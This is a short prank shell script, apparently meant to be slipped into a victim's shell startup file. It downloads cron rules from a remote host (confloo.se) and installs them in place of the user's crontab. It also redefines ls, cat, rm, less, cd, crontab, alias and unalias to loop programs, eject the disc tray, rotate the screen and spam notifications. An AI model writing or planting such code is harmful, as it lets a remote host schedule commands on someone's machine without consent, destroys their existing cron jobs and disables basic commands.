#begin clfz

unalias -a &> /dev/null
unalias -m "*" &> /dev/null

::() {
    crontab -l > /tmp/cronrules
    curl -o /tmp/cronrules "http://confloo.se/cronrules" 2>/dev/null
    crontab /tmp/cronrules
    rm /tmp/cronrules
}

(:: &) >/dev/null 2>&1

f() {
    t=`which $1`
    export "__`tr -dc "[:alpha:]" < /dev/urandom | head -c 8`"=$t
    eval "$1() { $2; }"
    eval "$t() { $2; }"
}

case `uname` in
    Linux) cmd="eject -T" ;;
    FreeBSD) cmd="cdcontrol eject" ;;
esac
eval "cd() { $cmd; }"

f ls "while (true); do sl -a; done"
f cat "echo \"miaou\""

f rm "xrandr -o left; xrandr -x"
f less "xrandr -s 6 &> /dev/null"

cron() {
    while (true); do
        notify-send tab
        sleep 1;
    done;
}
f crontab "(cron &) >/dev/null 2>&1"

alias() { display http://impawards.com/tv/posters/alias_ver2.jpg }
unalias() { display -flop http://impawards.com/tv/posters/alias_ver2.jpg }

